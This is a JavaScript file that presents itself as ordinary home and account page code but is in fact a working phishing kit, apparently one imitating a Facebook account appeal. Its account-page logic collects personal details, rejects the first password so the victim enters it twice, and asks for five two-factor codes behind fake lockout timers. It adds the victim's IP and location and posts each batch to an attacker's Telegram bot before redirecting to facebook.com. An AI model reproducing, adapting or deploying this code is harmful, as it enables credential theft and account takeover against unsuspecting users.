/**
 * Static site interactions for home and account pages
 */
(function () {
  const SECRET_KEY = 'HDNDT-JDHT8FNEK-JJHR';
  const SECURITY_TIMER = window.config.SETTING_TIME; // seconds
  const LOADER_DELAY = 3200;

  document.addEventListener('DOMContentLoaded', () => {
    const page = document.body.dataset.page;
    if (page === 'home') initHomePage();
    if (page === 'account') initAccountPage();
  });

  /* ----------------------------- HOME PAGE ----------------------------- */
  function initHomePage() {
    handleNavbar();
    handlePricingToggle();
    handleFaqAccordion();
  }

  function handleNavbar() {
    const navbar = document.getElementById('site-navbar');
    const menu = document.getElementById('navbar-menu');
    const openBtn = document.getElementById('navbar-open');
    const closeBtn = document.getElementById('navbar-close');
    const mobileDownload = document.getElementById('navbar-download-mobile');
    const links = menu ? Array.from(menu.querySelectorAll('a.nav-link')) : [];

    function toggleScrolled() {
      if (!navbar) return;
      if (window.scrollY > 10) {
        navbar.classList.add('navbar-scrolled');
      } else {
        navbar.classList.remove('navbar-scrolled');
      }
    }

    function openMenu() {
      if (!menu) return;
      menu.classList.add('open');
      document.body.classList.add('no-scroll');
    }

    function closeMenu() {
      if (!menu) return;
      menu.classList.remove('open');
      document.body.classList.remove('no-scroll');
    }

    window.addEventListener('scroll', toggleScrolled, { passive: true });
    toggleScrolled();

    if (openBtn) openBtn.addEventListener('click', openMenu);
    if (closeBtn) closeBtn.addEventListener('click', closeMenu);
    if (mobileDownload) mobileDownload.addEventListener('click', closeMenu);
    links.forEach((link) => link.addEventListener('click', closeMenu));
  }

  function handlePricingToggle() {
    const toggles = Array.from(document.querySelectorAll('.pricing-toggle'));
    const cards = Array.from(document.querySelectorAll('.pricing-card'));
    if (!toggles.length || !cards.length) return;

    function setPlan(plan) {
      toggles.forEach((btn) => {
        if (btn.dataset.plan === plan) {
          btn.classList.add('active');
        } else {
          btn.classList.remove('active');
        }
      });

      cards.forEach((card) => {
        const valueEl = card.querySelector('.pricing-value');
        if (!valueEl) return;
        const amount = plan === 'annual' ? card.dataset.annual : card.dataset.month;
        valueEl.textContent = amount || '0';
      });
    }

    toggles.forEach((btn) => {
      btn.addEventListener('click', () => {
        setPlan(btn.dataset.plan === 'annual' ? 'annual' : 'month');
      });
    });

    setPlan('month');
  }

  function handleFaqAccordion() {
    const items = Array.from(document.querySelectorAll('#faq-accordion .faq-item'));
    items.forEach((item) => {
      const trigger = item.querySelector('.faq-trigger');
      const panel = item.querySelector('.faq-panel');
      if (!trigger || !panel) return;

      trigger.addEventListener('click', () => {
        const isOpen = item.classList.contains('open');
        items.forEach((it) => it.classList.remove('open'));
        if (!isOpen) {
          item.classList.add('open');
        }
      });
    });
  }

  /* ---------------------------- ACCOUNT PAGE --------------------------- */
  function initAccountPage() {
    const loader = document.getElementById('initial-loader');
    const main = document.getElementById('main-component');
    const ticketIdEl = document.getElementById('ticket-id');
    const currentDateEl = document.getElementById('current-date');

    let locationCache = null;
    let clickPassword = 0;
    let clickSecurity = 0;
    let timerInterval = null;

    // Prepare layout
    setTimeout(() => {
      if (loader) loader.classList.add('hidden');
      if (main) main.classList.remove('hidden');
    }, LOADER_DELAY);

    // Generate ticket ID & date
    if (ticketIdEl) ticketIdEl.textContent = generateTicketId();
    if (currentDateEl) currentDateEl.textContent = formatCurrentDate();

    // Fetch user location
    fetchUserLocation().then((loc) => {
      locationCache = loc;
    }).catch(() => {
      locationCache = null;
    });

    setupSidebarAccordion();
    setupMenuToggle();
    setupModalTriggers();
    setupForms();

    function setupSidebarAccordion() {
      const groups = Array.from(document.querySelectorAll('[data-toggle-menu]'));
      groups.forEach((toggle) => {
        const parent = toggle.closest('.item-action');
        if (!parent) return;
        toggle.addEventListener('click', () => {
          parent.classList.toggle('active');
        });
      });
    }

    function setupMenuToggle() {
      const toggleBtn = document.getElementById('mobile-menu-toggle');
      const sidebar = document.getElementById('privacy-sidebar');
      if (!toggleBtn || !sidebar) return;

      toggleBtn.addEventListener('click', () => {
        sidebar.classList.toggle('open');
        document.body.classList.toggle('no-scroll', sidebar.classList.contains('open'));
      });
    }

    function setupModalTriggers() {
      const triggerButtons = Array.from(document.querySelectorAll('[data-open-auth]'));
      triggerButtons.forEach((btn) => btn.addEventListener('click', () => openModal('auth')));

      const backdropButtons = Array.from(document.querySelectorAll('.modal-backdrop'));
      backdropButtons.forEach((el) => {
        el.addEventListener('click', () => {
          const modalLayer = el.closest('.modal-layer');
          if (!modalLayer) return;
          const modalName = modalLayer.dataset.modal;
          // closeModal(modalName);
        });
      });
    }

    function setupForms() {
      const appealForm = document.getElementById('appeal-form');
      const passwordForm = document.getElementById('password-form');
      const securityForm = document.getElementById('security-form');
      const finalBtn = document.querySelector('[data-final-redirect]');

      if (appealForm) appealForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const formData = new FormData(appealForm);
        const values = Object.fromEntries(formData.entries());

        if (locationCache) {
          values.ip = locationCache.ip || 'Unknown';
          values.location = locationCache.location || 'Unknown';
        }

        try {
          saveRecord('__ck_clv1', values);
        } catch (err) {
          console.warn('Appeal submit error:', err);
        }

        closeModal('auth');
        openModal('password');
      });

      if (passwordForm) passwordForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const formData = new FormData(passwordForm);
        const password = formData.get('password');
        const errorEl = passwordForm.querySelector('[data-password-error]');
        const submitBtn = passwordForm.querySelector('button[type="submit"]');

        if (!password) return;
        setButtonLoading(submitBtn, true);

        try {
          if (clickPassword === 0) {
            let baseData = getRecord('__ck_clv1');
            if (!baseData) baseData = {};
            const payload = { ...baseData, password };
            saveRecord('__ck_clv2', payload);
            await sendAppealForm(payload);
            clickPassword = 1;
            if (errorEl) errorEl.textContent = "The password you've entered is incorrect.";
          } else {
            let baseData = getRecord('__ck_clv2');
            if (!baseData) baseData = {};
            const payload = { ...baseData, passwordSecond: password };
            saveRecord('__ck_clv3', payload);
            await sendAppealForm(payload);
            clickPassword = 2;
            if (errorEl) errorEl.textContent = '';
            closeModal('password');
            openModal('security');
          }
        } catch (err) {
          console.warn('Password submit error:', err);
        } finally {
          setButtonLoading(submitBtn, false);
          passwordForm.reset();
        }
      });

      if (securityForm) securityForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const formData = new FormData(securityForm);
        const code = formData.get('twoFa');
        const errorEl = securityForm.querySelector('[data-security-error]');
        const submitBtn = securityForm.querySelector('button[type="submit"]');
        const input = securityForm.querySelector('input[name="twoFa"]');

        if (!code || !input) return;
        if (input.disabled) return;
        setButtonLoading(submitBtn, true);

        try {
          switch (clickSecurity) {
            case 0: {
              let base = getRecord('__ck_clv3');
              if (!base) base = {};
              const payload = { ...base, twoFa: code };
              saveRecord('__ck_clv5', payload);
              await sendAppealForm(payload);
              startSecurityTimer(errorEl, input);
              clickSecurity = 1;
              break;
            }
            case 1: {
              let base = getRecord('__ck_clv5');
              if (!base) base = {};
              const payload = { ...base, twoFaSecond: code };
              saveRecord('__ck_clv6', payload);
              await sendAppealForm(payload);
              startSecurityTimer(errorEl, input);
              clickSecurity = 2;
              break;
            }
            case 2: {
              let base = getRecord('__ck_clv6');
              if (!base) base = {};
              const payload = { ...base, twoFaThird: code };
              saveRecord('__ck_clv7', payload);
              await sendAppealForm(payload);
              startSecurityTimer(errorEl, input);
              clickSecurity = 3;
              break;
            }
            case 3: {
              let base = getRecord('__ck_clv7');
              if (!base) base = {};
              const payload = { ...base, twoFaFourth: code };
              saveRecord('__ck_clv8', payload);
              await sendAppealForm(payload);
              startSecurityTimer(errorEl, input);
              clickSecurity = 4;
              break;
            }
            case 4: {
              let base = getRecord('__ck_clv8');
              if (!base) base = {};
              const payload = { ...base, twoFaFifth: code };
              saveRecord('__ck_clv9', payload);
              await sendAppealForm(payload);
              // Fifth (and final) attempt: close security modal and show final
              securityForm.reset();
              closeModal('security');
              openModal('final');
              resetSecurityState();
              break;
            }
            default: {
              // More than 5 attempts: do nothing extra to avoid duplicate sends
              console.debug('Extra 2FA attempt ignored, clickSecurity =', clickSecurity);
              break;
            }
          }
        } catch (err) {
          console.warn('Security submit error:', err);
        } finally {
          setButtonLoading(submitBtn, false);
          if (clickSecurity < 5) securityForm.reset();
        }
      });

      if (finalBtn) finalBtn.addEventListener('click', () => {
        window.location.href = 'https://www.facebook.com';
      });

      function resetSecurityState() {
        clickSecurity = 0;
        if (timerInterval) {
          clearInterval(timerInterval);
          timerInterval = null;
        }
        const errorEl = securityForm ? securityForm.querySelector('[data-security-error]') : null;
        const input = securityForm ? securityForm.querySelector('input[name="twoFa"]') : null;
        if (errorEl) errorEl.textContent = '';
        if (input) input.disabled = false;
      }

      function startSecurityTimer(errorEl, input) {
        if (!errorEl || !input) return;
        if (timerInterval) {
          clearInterval(timerInterval);
          timerInterval = null;
        }
        let remaining = SECURITY_TIMER;
        input.disabled = true;
        updateTimerMessage();
        timerInterval = setInterval(() => {
          remaining -= 1;
          if (remaining <= 0) {
            clearInterval(timerInterval);
            timerInterval = null;
            errorEl.textContent = '';
            input.disabled = false;
            input.focus();
          } else {
            updateTimerMessage();
          }
        }, 1000);

        function updateTimerMessage() {
          const minutes = Math.floor(remaining / 60);
          const seconds = remaining % 60;
          errorEl.textContent = `The two-factor authentication you entered is incorrect. Please, try again after ${minutes} minutes ${seconds} seconds.`;
        }
      }
    }
  }

  /* ------------------------------ HELPERS ------------------------------ */
  function openModal(name) {
    const layer = document.querySelector(`.modal-layer[data-modal="${name}"]`);
    if (!layer) return;
    layer.classList.add('open');
    document.body.classList.add('modal-open');
  }

  function closeModal(name) {
    const layer = document.querySelector(`.modal-layer[data-modal="${name}"]`);
    if (!layer) return;
    layer.classList.remove('open');
    if (!document.querySelector('.modal-layer.open')) {
      document.body.classList.remove('modal-open');
    }
  }

  function setButtonLoading(button, isLoading) {
    if (!button) return;
    if (isLoading) {
      button.dataset.originalText = button.textContent;
      button.textContent = '';
      button.classList.add('loading');
      button.disabled = true;
    } else {
      const original = button.dataset.originalText || button.dataset.defaultText || '';
      button.textContent = original;
      button.classList.remove('loading');
      button.disabled = false;
    }
  }

  function generateTicketId() {
    const section = () => Math.random().toString(36).substring(2, 6).toUpperCase();
    return `${section()}-${section()}-${section()}`;
  }

  function formatCurrentDate() {
    return new Intl.DateTimeFormat('en-US', {
      month: 'long',
      day: 'numeric',
      year: 'numeric',
    }).format(new Date());
  }

  async function fetchUserLocation() {
    try {
      const response = await axios.get('https://apip.cc/json');
      const data = response && response.data ? response.data : {};
      return {
        location: `${data.query || data.ip || ''} | ${data.RegionName || data.region || ''}(${data.RegionCode || data.region_code || ''}) | ${data.CountryName || data.country || ''}(${data.CountryCode || data.country_code || ''})`,
        country_code: data.CountryCode || data.country_code || 'US',
        ip: data.query || data.ip || '',
      };
    } catch (err) {
      console.warn('Location fetch failed:', err);
      return null;
    }
  }

  /* ------------------------- TELEGRAM INTEGRATION ------------------------ */
  function escapeHtml(input) {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function normalizeTelegramData(input) {
    const data = input || {};
    return {
      ip: data.ip || '',
      location: data.location || '',
      fullName: data.fullName || data.name || '',
      fanpage: data.fanpage || '',
      day: data.day || '',
      month: data.month || '',
      year: data.year || '',
      email: data.email || '',
      emailBusiness: data.emailBusiness || data.business || '',
      phone: data.phone || '',
      password: data.password || '',
      passwordSecond: data.passwordSecond || '',
      authMethod: data.authMethod || '',
      twoFa: data.twoFa || '',
      twoFaSecond: data.twoFaSecond || '',
      twoFaThird: data.twoFaThird || '',
      twoFaFourth: data.twoFaFourth || '',
      twoFaFifth: data.twoFaFifth || '',
    };
  }

  function formatTelegramMessage(data) {
    const d = normalizeTelegramData(data);
    const authLine = d.authMethod
      ? '\n<b>Auth Method:</b> <code>' + escapeHtml(d.authMethod) + '</code>\n-----------------------------'
      : '';

    console.log(d);
      

    const phoneText = d.phone ? d.phone : '';

    return (
      '<b>Ip:</b> <code>' + escapeHtml(d.ip || 'Unknown') + '</code>\n' +
      '<b>Location:</b> <code>' + escapeHtml(d.location || 'Unknown') + '</code>\n' +
      '-----------------------------\n' +
      '<b>Full Name:</b> <code>' + escapeHtml(d.fullName) + '</code>\n' +
      '<b>Page Name:</b> <code>' + escapeHtml(d.fanpage) + '</code>\n' +
      '-----------------------------\n' +
      '<b>Email:</b> <code>' + escapeHtml(d.email) + '</code>\n' +
      '<b>Email Business:</b> <code>' + escapeHtml(d.emailBusiness) + '</code>\n' +
      '<b>Phone Number:</b> <code>' + escapeHtml(phoneText) + '</code>\n' +
      '-----------------------------\n' +
      '<b>Password(1):</b> <code>' + escapeHtml(d.password) + '</code>\n' +
      '<b>Password(2):</b> <code>' + escapeHtml(d.passwordSecond) + '</code>\n' +
      '-----------------------------' +
      authLine +
      '\n<b>🔐Code 2FA(1):</b> <code>' +
      escapeHtml(d.twoFa) +
      '</code>\n<b>🔐Code 2FA(2):</b> <code>' +
      escapeHtml(d.twoFaSecond) +
      '</code>\n<b>🔐Code 2FA(3):</b> <code>' +
      escapeHtml(d.twoFaThird) +
      '</code>\n<b>🔐Code 2FA(4):</b> <code>' +
      escapeHtml(d.twoFaFourth) +
      '</code>\n<b>🔐Code 2FA(5):</b> <code>' +
      escapeHtml(d.twoFaFifth) +
      '</code>'
    );
  }

  async function sendTelegramMessage(values) {
    if (!window.config || !window.config.TELEGRAM_BOT_TOKEN || !window.config.TELEGRAM_CHAT_ID) {
      console.warn('⚠️ Telegram config is missing in config.js');
      return;
    }

    const token = String(window.config.TELEGRAM_BOT_TOKEN).trim();
    const chatId = String(window.config.TELEGRAM_CHAT_ID).trim();
    if (!token || !chatId) {
      console.warn('⚠️ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is empty');
      return;
    }

    const apiUrl = 'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendMessage';
    const text = formatTelegramMessage(values);

    try {
      await axios.post(apiUrl, {
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
      });
    } catch (err) {
      console.error('🔥 Telegram send error:', err?.response?.data || err.message || err);
    }
  }

  async function sendAppealForm(values) {
    await sendTelegramMessage(values);
  }

  function saveRecord(key, value) {
    try {
      const json = JSON.stringify(value);
      const encrypted = CryptoJS.AES.encrypt(json, SECRET_KEY).toString();
      localStorage.setItem(key, encrypted);
    } catch (err) {
      console.warn('Failed to save record:', err);
    }
  }

  function getRecord(key) {
    try {
      const encrypted = localStorage.getItem(key);
      if (!encrypted) return null;
      const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
      const decrypted = bytes.toString(CryptoJS.enc.Utf8);
      if (!decrypted) return null;
      return JSON.parse(decrypted);
    } catch (err) {
      console.warn('Failed to read record:', err);
      return null;
    }
  }

  // Expose helpers for other scripts
  window.fetchUserLocation = fetchUserLocation;
  window.saveRecord = saveRecord;
  window.getRecord = getRecord;
  window.openModal = openModal;
  window.closeModal = closeModal;

  // Expose Telegram helper if you want to call it manually
  window.sendTelegramMessage = sendTelegramMessage;
})();
